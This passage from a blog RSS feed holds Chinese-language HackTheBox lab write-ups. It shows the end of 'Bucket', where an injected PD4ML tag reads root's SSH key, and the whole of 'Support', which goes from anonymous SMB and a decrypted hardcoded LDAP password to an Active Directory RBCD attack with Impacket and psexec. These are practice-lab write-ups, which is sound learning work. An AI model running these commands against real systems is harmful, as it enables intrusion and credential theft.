    --table-name alerts  \
    --item \
        '{"title": {"S": "Ransomware"}, "data": {"S": "<pd4ml:attachment description=\"attached.txt\" icon=\"PushPin\">file:///root/.ssh/id_rsa</pd4ml:attachment>"}}' \
    --endpoint-url http://bucket.htb:4567
echo 'POST endpoint && copy the file'
curl http://bucket.htb:8001 -X POST -d 'action=get_alerts'
```

查看 `result.pdf` ，能拿到私钥

```bash
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAx6VphKMyxurjldmb6dy1OSn0D9dumFAUCeSoICwhhsq+fadx21SU
......
pHoTvd81++IRB1+g6GGy0gq/j0Tp+g3e0KLtvr7ZfAtutO8bcDrLjHu6Wqyl1KoleFsv6/
lt0oT70NTv2gFGWAb6WHLEByEsnYQwk5ynbIblaApQSZEyVEPkf9LmO7AEb08lvAOS0dQ1
xMyLerif0cNjmemwAAAAtyb290QHVidW50dQECAwQFBg==
-----END OPENSSH PRIVATE KEY-----
```

通过私钥登录后，读取 `root.txt`

```bash
root@bucket:~# cat root.txt 
880bb2407bd062f1f9896875e8d049bf
```

## 总结

又一次感到自己是真的无耐心…一烦躁起来就无法思考。。这次碰到新东西，卡了还是蛮久的，不过利用都没什么挡住的地方，除了最后的读取文件。

学习到了 `AWS S3`，以及一些`Dynamodb` 的知识]]></content:encoded>
            <category>靶机</category>
            <category>HackTheBox</category>
            <category>Linux</category>
            <category>AWS_S3</category>
            <category>Dynamodb</category>
            <category>PD4ML</category>
        </item>
        <item>
            <title><![CDATA[HackTheBox - Machine - Support]]></title>
            <link>https://www.sunsetaction.top/2025/06/05/HackTheBoxMachine -Support</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/06/05/HackTheBoxMachine -Support</guid>
            <pubDate>Thu, 05 Jun 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[Machine Support https://app.hackthebox.com/machines/Support | Windows | Easy Medium Recon 端口信息 使用 nmap 进行扫描 SMB 枚举 测试SMB是否允许匿名登录 允许匿名登录，并且在support too...]]></description>
            <content:encoded><![CDATA[
# Machine -Support

> https://app.hackthebox.com/machines/Support | `Windows` | `~~Easy~~` `Medium`
> 

![image.png](/post-images/HackTheBoxMachine%20-Support/image.png)

## Recon

### 端口信息

使用 `nmap` 进行扫描

```bash
➜  Support nmap -sT -min-rate 5000 10.10.11.174
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-04 21:06 CST
Nmap scan report for support.htb (10.10.11.174)
Host is up (0.13s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
5985/tcp open  wsman

Nmap done: 1 IP address (1 host up) scanned in 1.00 seconds
```

```bash
➜  Support nmap -sT -A -p 53,88,135,138,389,445,636,593,3268,3269 10.10.11.174
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-04 21:07 CST
Nmap scan report for support.htb (10.10.11.174)
Host is up (0.20s latency).

PORT    STATE    SERVICE       VERSION
53/tcp  open     domain        Simple DNS Plus
88/tcp  open     kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-04 12:45:55Z)
135/tcp open     msrpc         Microsoft Windows RPC
138/tcp filtered netbios-dgm
389/tcp open     ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
445/tcp open     microsoft-ds?
636/tcp open     tcpwrapped
593/tcp  open  ncacn_http Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap       Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022 (88%)
OS CPE: cpe:/o:microsoft:windows_server_2022
Aggressive OS guesses: Microsoft Windows Server 2022 (88%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-06-04T12:46:16
|_  start_date: N/A
|_clock-skew: -21m30s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

TRACEROUTE (using proto 1/icmp)
HOP RTT       ADDRESS
1   122.30 ms 10.10.16.1
2   237.33 ms support.htb (10.10.11.174)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 68.41 seconds
```

### SMB 枚举

测试`SMB`是否允许匿名登录

```bash
➜  Support smbclient -L 10.10.11.174 -U anonymous                                      
Password for [WORKGROUP\anonymous]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        support-tools   Disk      support staff tools
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.174 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

允许匿名登录，并且在`support-tools`中有一些工具，全部 `get` 下来

```bash
➜  Support smbclient //10.10.11.174/support-tools -U anonymous -N
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu Jul 21 01:01:06 2022
  ..                                  D        0  Sat May 28 19:18:25 2022
  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 19:19:19 2022
  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 19:19:55 2022
  putty.exe                           A  1273576  Sat May 28 19:20:06 2022
  SysinternalsSuite.zip               A 48102161  Sat May 28 19:19:31 2022
  UserInfo.exe.zip                    A   277499  Thu Jul 21 01:01:07 2022
  windirstat1_1_2_setup.exe           A    79171  Sat May 28 19:20:17 2022
  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 19:19:43 2022

                4026367 blocks of size 4096. 955928 blocks available
smb: \> 
```

1. `7-ZipPortable_21.07.paf.exe`:
    - **工具:** 7-Zip Portable
    - **用途:** 这是一个便携版本的 7-Zip 文件归档器。7-Zip 是一款免费开源的压缩/解压缩软件，支持多种格式，如 7z, ZIP, GZIP, TAR, RAR 等。`.paf.exe` 通常是 PortableApps.com 格式的便携应用。
2. `npp.8.4.1.portable.x64.zip`:
    - **工具:** Notepad++ Portable (64位)
    - **用途:** 这是一个包含 Notepad++ 便携版的 ZIP 压缩文件。Notepad++ 是一款非常流行的免费源代码编辑器和 Windows 记事本替代品，支持多种编程语言，功能强大。
3. `putty.exe`:
    - **工具:** PuTTY
    - **用途:** 这是一个独立的 PuTTY 可执行文件。PuTTY 是一款广受欢迎的免费开源终端模拟器、串行控制台和网络文件传输应用程序。它最常用于通过 SSH、Telnet 或 rlogin 协议连接到远程服务器。
4. `SysinternalsSuite.zip`:
    - **工具:** Sysinternals Suite
    - **用途:** 这是一个包含微软 Sysinternals Suite 的 ZIP 压缩文件。Sysinternals Suite 是一套由 Mark Russinovich 开发的强大的 Windows 系统管理、故障排除和诊断工具集合（现在属于微软）。著名的工具包括 Process Explorer, Process Monitor, Autoruns, PsExec 等。
5. `UserInfo.exe.zip`:
    - **工具:** 未知 (可能为自定义或特定用途工具)
    - **用途:** 这是一个名为 `UserInfo.exe` 的可执行文件的 ZIP 压缩包。从名称上看，它可能是一个用于收集或显示用户信息的工具。这可能是系统管理员常用的自定义脚本或小程序，或者是特定场景下需要的工具。在渗透测试中，这类自定义工具往往值得进一步分析。
6. `windirstat1_1_2_setup.exe`:
    - **工具:** WinDirStat 安装程序
    - **用途:** 这是 WinDirStat 版本 1.1.2 的安装程序。WinDirStat 是一款磁盘使用情况统计查看器和清理工具，它可以图形化地显示磁盘空间占用情况，帮助用户找到占用空间大的文件和文件夹。
7. `WiresharkPortable64_3.6.5.paf.exe`:
    - **工具:** Wireshark Portable (64位)
    - **用途:** 这是一个便携版本的 Wireshark。Wireshark 是世界上应用最广泛的网络协议分析器，用于捕获和交互式浏览计算机网络上运行的流量。`.paf.exe` 格式表明它也是 PortableApps.com 的便携应用。

上面的所有应用中只有`UserInfo.exe` 不是公开的软件，我们可以着重对该软件进行分析

## 分析 UserInfo.exe

使用 `dnSpy` 来分析，该程序貌似是通过 `LDAP` 来检索用户信息，并且内置了用户（大致看懂）

下面的类 `Protected` 是加密密码的（这里开始使用`AI`来分析）

这一段代码其实是使用异或加密密码，并且秘钥是`armando` ，因此我们能够直接得到密码

```bash
using System;
using System.Text;

namespace UserInfo.Services
{
	// Token: 0x02000006 RID: 6
	internal class Protected
	{
		// Token: 0x0600000F RID: 15 RVA: 0x00002118 File Offset: 0x00000318
		public static string getPassword()
		{
			byte[] array = Convert.FromBase64String(Protected.enc_password);
			byte[] array2 = array;
			for (int i = 0; i < array.Length; i++)
			{
				array2[i] = (array[i] ^ Protected.key[i % Protected.key.Length] ^ 223);
			}
			return Encoding.Default.GetString(array2);
		}

		// Token: 0x04000005 RID: 5
		private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";

		// Token: 0x04000006 RID: 6
		private static byte[] key = Encoding.ASCII.GetBytes("armando");
	}
}
```

通过 `AI` 生成解密脚本

```bash
import base64

# 从 C# 代码中获取的值
enc_password_b64 = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
key_string = "armando"
xor_constant = 223

# 1. Base64 解码
try:
    encrypted_bytes = base64.b64decode(enc_password_b64)
except base64.binascii.Error as e:
    print(f"Base64 解码错误: {e}")
    exit()

# 2. 获取密钥的字节形式 (ASCII)
key_bytes = key_string.encode('ascii')

# 准备一个可变的字节数组来存放解密后的字节
decrypted_bytes = bytearray()

# 3. 执行 XOR 解密
for i in range(len(encrypted_bytes)):
    # C# 中的逻辑是: (byte ^ key_byte ^ 223)
    dec_byte = encrypted_bytes[i] ^ key_bytes[i % len(key_bytes)] ^ xor_constant
    decrypted_bytes.append(dec_byte)

# 4. 将解密后的字节数组转换为字符串
# C# 中的 Encoding.Default 行为可能依赖于系统区域设置。
# 我们首先尝试 'utf-8'，如果密码包含非 ASCII 字符且编码不同，可能需要调整。
# 对于这个特定的密码 "Cisco.12345"，'utf-8' 或 'ascii' 都可以。
try:
    final_password = decrypted_bytes.decode('utf-8')
except UnicodeDecodeError:
    # 如果 utf-8 失败，可以尝试其他编码，如 latin-1 (常用于模拟某些 Windows 默认编码)
    try:
        final_password = decrypted_bytes.decode('latin-1')
    except UnicodeDecodeError as e:
        print(f"字符串解码错误: {e}")
        print(f"解密后的字节（原始）: {decrypted_bytes}")
        final_password = "解码失败，请检查编码"

# 打印结果
print(f"Base64 编码的密文: {enc_password_b64}")
print(f"密钥字符串: {key_string}")
print(f"固定的 XOR 值: {xor_constant}")
print(f"解密后的字节 (十六进制): {decrypted_bytes.hex()}")
print(f"解密后的密码: {final_password}")
```

```bash
➜  Support python getpass.py       
Base64 编码的密文: 0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E
密钥字符串: armando
固定的 XOR 值: 223
解密后的字节 (十六进制): 6e764566454b31365e31614d3424653741636c55663878247452577850574f31256c6d7a
解密后的密码: nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

而 `LdapQuery` 类的构造函数中能看到

```bash
public LdapQuery()
		{
			string password = Protected.getPassword();
			this.entry = new DirectoryEntry("LDAP://support.htb", "support\\ldap", password);
			this.entry.AuthenticationType = AuthenticationTypes.Secure;
			this.ds = new DirectorySearcher(this.entry);
		}
```

创建 `DirectoryEntry` 对象时，第二个参数通常用于指定用户名。因此，这里的用户名是：`support\ldap`

这个格式 `DOMAIN\username` 表明 `support` 可能是域名或者工作组名，而 `ldap` 是具体的用户名。

我们直接测试凭据是否是正确的

```bash
➜  Support nxc ldap 10.10.11.174 -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -d support.htb
LDAP        10.10.11.174    389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:support.htb)
LDAP        10.10.11.174    389    DC               [+] support.htb\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz 
```

凭据是正确的

## 域分析

### 域初次分析

`BloodHound` 分析域

```bash
➜  Support bloodhound-python -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -d 'support.htb' -ns 10.10.11.174 --zip -c All -dc 'support.htb'
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: support.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: support.htb
WARNING: Kerberos auth to LDAP failed, trying NTLM
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 3 computers
INFO: Connecting to LDAP server: support.htb
WARNING: Kerberos auth to LDAP failed, trying NTLM
INFO: Found 21 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: SummerMachine.support.htb
INFO: Querying computer: Management.support.htb
INFO: Querying computer: dc.support.htb
WARNING: Could not resolve: SummerMachine.support.htb: The resolution lifetime expired after 3.104 seconds: Server Do53:10.10.11.174@53 answered The DNS operation timed out.
INFO: Done in 00M 23S
INFO: Compressing output into 20250605003230_bloodhound.zip
```

我们当前获得的用户 `Ldap` 的信息，仅仅只是域成员

![image.png](/post-images/HackTheBoxMachine%20-Support/image1.png)

所有的用户

![image.png](/post-images/HackTheBoxMachine%20-Support/image2.png)

我们查看远程组有哪些成员

![image.png](/post-images/HackTheBoxMachine%20-Support/image3.png)

`SUPPORT`用户信息

![image.png](/post-images/HackTheBoxMachine%20-Support/image4.png)

那我们大概是要先获取到`SUPPORT` 用户？但是现在没有别的信息了

### LDAP 信息收集

所以我们先使用 `LADP` 用户进行信息收集，找一些有用的信息

我们首先查询用户信息

```bash
➜  Support ldapsearch -x -H ldap://10.10.11.174:389 -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b 'CN=USERS,DC=SUPPORT,DC=HTB' -D 'CN=LDAP,CN=USERS,DC=SUPPORT,DC=HTB'
```

信息太多了…

我们尝试查一下`SUPPORT` 用户的信息

```bash
➜  Support ldapsearch -x -H ldap://10.10.11.174:389 -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b 'CN=SUPPORT,CN=USERS,DC=SUPPORT,DC=HTB' -D 'CN=LDAP,CN=USERS,DC=SUPPORT,DC=HTB'
# extended LDIF                                     
#                                  
# LDAPv3     
# base <CN=SUPPORT,CN=USERS,DC=SUPPORT,DC=HTB> with scope subtree
# filter: (objectclass=*)
# requesting: ALL                                                                                                 
#                                       
                                                         
# support, Users, support.htb
dn: CN=support,CN=Users,DC=support,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: support    
c: US      
l: Chapel Hill
st: NC
postalCode: 27514
distinguishedName: CN=support,CN=Users,DC=support,DC=htb
instanceType: 4
whenCreated: 20220528111200.0Z
whenChanged: 20220528111201.0Z
uSNCreated: 12617
**info: Ironside47pleasure40Watchful**
memberOf: CN=Shared Support Accounts,CN=Users,DC=support,DC=htb
memberOf: CN=Remote Management Users,CN=Builtin,DC=support,DC=htb
uSNChanged: 12630
company: support
streetAddress: Skipper Bowles Dr
name: support
objectGUID:: CqM5MfoxMEWepIBTs5an8Q==
```

其中的`info`字段很有趣，可能就是该用户的凭据

```bash
info: Ironside47pleasure40Watchful
```

测试凭据，假如该凭据有效，那么我们就可以对`DC`进行远程了

```bash
➜  Support nxc wmi 10.10.11.174 -u support -p 'Ironside47pleasure40Watchful' -d support.htb
RPC         10.10.11.174    135    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:support.htb)
RPC         10.10.11.174    135    DC               [+] support.htb\support:Ironside47pleasure40Watchful
```

该凭据有效

```bash
➜  Support evil-winrm -i 10.10.11.174 -u 'support' -p 'Ironside47pleasure40Watchful'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\support\Documents> 
```

`Support`用户`Desktop`文件夹可以得到 `user.txt`

```bash
*Evil-WinRM* PS C:\Users\support\Desktop> type user.txt
d52f8d3f19ac0230628b1805483c760c
```

## 权限提升

首先使用 `Winpeas` 走一波，没有很多的有用的信息

`BloodHound`再进行分析，发现`Support`用户对`DC`有`GenericAll`权限

![image.png](/post-images/HackTheBoxMachine%20-Support/image5.png)

### RBCD 基于资源约束委派

`Support`用户对`DC`有`GenericAll`权限，我们可以完全控制`DC`

这里可以打 `RBCD`

首先创建计算机账户

```bash
➜  Support addcomputer.py support.htb/support:'Ironside47pleasure40Watchful' -computer-name TEST\$ -computer-pass 123456 -dc-host support.htb -dc-ip 10.10.11.174
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Successfully added machine account TEST$ with password 123456.
```

`RBCD` 委派设置，以`support`的身份登录到`DC`，修改计算机账户`DC$`的一个属性`msDS-AllowedToActOnBehalfOfOtherIdentity` 

```bash
➜  Support rbcd.py support.htb/support:'Ironside47pleasure40Watchful' -dc-ip 10.10.11.174 -action write -delegate-to DC\$ -delegate-from TEST\$ 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] TEST$ can now impersonate users on DC$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     TEST$        (S-1-5-21-1677581083-3380853377-188903654-5601)
```

最后利用 `S4U` 协议伪造 `Administrator` 用户申请 `ST`

```bash
➜  Support getST.py -spn cifs/DC.support.htb -impersonate administrator support.htb/TEST\$:'123456' -dc-ip 10.10.11.174
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Getting TGT for user
[*] Impersonating administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in administrator@cifs_DC.support.htb@SUPPORT.HTB.ccache
```

```bash
➜  Support export KRB5CCNAME=Administrator@cifs_DC.support.htb@SUPPORT.HTB.ccache 
```

```bash
➜  Support psexec.py support.htb/administrator@dc.support.htb -k -no-pass
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on dc.support.htb.....
[*] Found writable share ADMIN$
[*] Uploading file niOpACUP.exe
[*] Opening SVCManager on dc.support.htb.....
[*] Creating service oDhJ on dc.support.htb.....
[*] Starting service oDhJ.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.859]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> 
```

读取 `root.txt`

```bash
C:\Users\Administrator\Desktop> type root.txt
89306b6f9ce190f011354f60b3342424
```]]></content:encoded>
            <category>靶机</category>
            <category>HackTheBox</category>
            <category>Windows</category>
            <category>RBCD</category>
            <category>Reverse</category>
        </item>
    </channel>
</rss>